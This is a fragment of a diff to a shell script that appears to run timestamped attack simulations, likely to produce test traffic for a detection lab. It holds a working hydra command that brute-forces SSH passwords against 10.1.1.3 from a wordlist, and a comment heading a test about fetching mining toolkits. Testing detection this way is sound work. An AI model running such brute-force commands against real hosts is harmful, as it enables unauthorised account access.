@@ -52,7 +52,7 @@ echo "stop test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 3 SSH - Google says 
 echo "start test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N') 
-hydra -f -l user -P /usr/share/wordlists/limitedwordlist.txt 10.1.1.3 -t 4 ssh
+hydra -f -l userattack -P /usr/share/wordlists/limitedwordlist.txt 10.1.1.3 -t 4 ssh
 echo "stop test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 4 Calling bitcoin wallets to download mining toolkits
